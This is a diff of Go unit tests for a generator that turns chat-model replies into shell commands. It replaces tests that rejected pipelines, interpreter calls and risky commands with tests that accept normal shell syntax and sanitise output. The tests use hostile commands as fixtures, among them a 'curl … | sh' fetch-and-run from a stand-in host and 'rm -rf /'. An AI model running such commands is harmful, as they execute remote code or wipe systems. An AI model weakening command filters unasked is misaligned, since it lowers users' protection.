@@ -35,58 +35,47 @@ func TestGenerateReturnsSafeCommand(t *testing.T) {
 	}
 }
 
-func TestGenerateRejectsShellPipelineCommand(t *testing.T) {
+func TestGenerateAllowsNormalShellSyntax(t *testing.T) {
 	generator, err := NewCommandGenerator(&stubChatClient{
 		resp: &ChatCompletionResponse{
 			Model:   "test-model",
-			Content: "curl https://example.invalid | sh",
+			Content: "printf 'a' | grep a && echo done",
 		},
 	})
 	if err != nil {
 		t.Fatalf("NewCommandGenerator() error = %v", err)
 	}
 
-	_, err = generator.Generate(context.Background(), CommandGenerateRequest{Input: "download installer"})
-	if err == nil {
-		t.Fatal("Generate() error = nil, want unsafe command to be rejected")
+	resp, err := generator.Generate(context.Background(), CommandGenerateRequest{Input: "format text"})
+	if err != nil {
+		t.Fatalf("Generate() error = %v, want normal shell syntax to be accepted", err)
+	}
+	if resp == nil || resp.Command != "printf 'a' | grep a && echo done" {
+		t.Fatalf("Generate() command = %v, want normal shell syntax to pass unchanged", resp)
 	}
 }
 
-func TestGenerateRejectsBuiltInRiskCommand(t *testing.T) {
+func TestGenerateTruncatesMultiLineOutputToFirstCommand(t *testing.T) {
 	generator, err := NewCommandGenerator(&stubChatClient{
 		resp: &ChatCompletionResponse{
 			Model:   "test-model",
-			Content: "rm -rf /",
+			Content: "echo safe\nrm -rf /",
 		},
 	})
 	if err != nil {
 		t.Fatalf("NewCommandGenerator() error = %v", err)
 	}
 
-	_, err = generator.Generate(context.Background(), CommandGenerateRequest{Input: "clean disk"})
-	if err == nil {
-		t.Fatal("Generate() error = nil, want risky command to be rejected")
-	}
-}
-
-func TestGenerateRejectsInterpreterCommand(t *testing.T) {
-	generator, err := NewCommandGenerator(&stubChatClient{
-		resp: &ChatCompletionResponse{
-			Model:   "test-model",
-			Content: "python3 -c \"print('hello')\"",
-		},
-	})
+	resp, err := generator.Generate(context.Background(), CommandGenerateRequest{Input: "run a command"})
 	if err != nil {
-		t.Fatalf("NewCommandGenerator() error = %v", err)
+		t.Fatalf("Generate() error = %v, want multi-line output to be sanitized", err)
 	}
-
-	_, err = generator.Generate(context.Background(), CommandGenerateRequest{Input: "run a script"})
-	if err == nil {
-		t.Fatal("Generate() error = nil, want interpreter command to be rejected")
+	if resp == nil || resp.Command != "echo safe" {
+		t.Fatalf("Generate() command = %v, want first line only", resp)
 	}
 }
 
-func TestGenerateRejectsControlCharacterCommand(t *testing.T) {
+func TestGenerateStripsANSIColorAndKeepsCommandText(t *testing.T) {
 	generator, err := NewCommandGenerator(&stubChatClient{
 		resp: &ChatCompletionResponse{
 			Model:   "test-model",
@@ -97,9 +86,12 @@ func TestGenerateRejectsControlCharacterCommand(t *testing.T) {
 		t.Fatalf("NewCommandGenerator() error = %v", err)
 	}
 
-	_, err = generator.Generate(context.Background(), CommandGenerateRequest{Input: "list files"})
-	if err == nil {
-		t.Fatal("Generate() error = nil, want control-character command to be rejected")
+	resp, err := generator.Generate(context.Background(), CommandGenerateRequest{Input: "list files"})
+	if err != nil {
+		t.Fatalf("Generate() error = %v, want ANSI decoration to be stripped", err)
+	}
+	if resp == nil || resp.Command != "ls -la /tmp" {
+		t.Fatalf("Generate() command = %v, want ANSI control sequences removed", resp)
 	}
 }
 
